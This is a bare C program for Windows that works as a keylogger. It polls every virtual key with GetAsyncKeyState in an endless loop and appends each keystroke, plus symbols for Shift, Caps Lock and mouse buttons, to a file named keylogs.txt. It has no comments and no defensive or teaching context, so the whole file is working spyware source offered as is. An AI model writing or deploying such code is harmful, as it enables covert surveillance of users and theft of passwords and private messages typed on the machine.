#include <stdio.h>
#include <windows.h>

void saveToFile(char key) {
    FILE *file;
    file = fopen("keylogs.txt", "a");
    fputc(key, file);
    fclose(file);
}

int main() {
    char key;

    while (1) {
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (key == VK_SPACE) {
                    saveToFile(' ');
                } else if (key == VK_RETURN) {
                    saveToFile('\n');
                } else if (key == VK_BACK) {
                    saveToFile('\b');
                } else if (key == VK_TAB) {
                    saveToFile('\t');
                } else if (key == VK_SHIFT) {
                    saveToFile('*');
                } else if (key == VK_CAPITAL) {
                    saveToFile('#');
                } else if (key == VK_ESCAPE) {
                    saveToFile('^');
                } else if (key == VK_LBUTTON) {
                    saveToFile('<');
                } else if (key == VK_RBUTTON) {
                    saveToFile('>');
                } else if (key == VK_MBUTTON) {
                    saveToFile('@');
                } else if (key == VK_XBUTTON1) {
                    saveToFile('[');
                } else if (key == VK_XBUTTON2) {
                    saveToFile(']');
                } else {
                    saveToFile(key);
                }
            }
        }
    }

    return 0;
}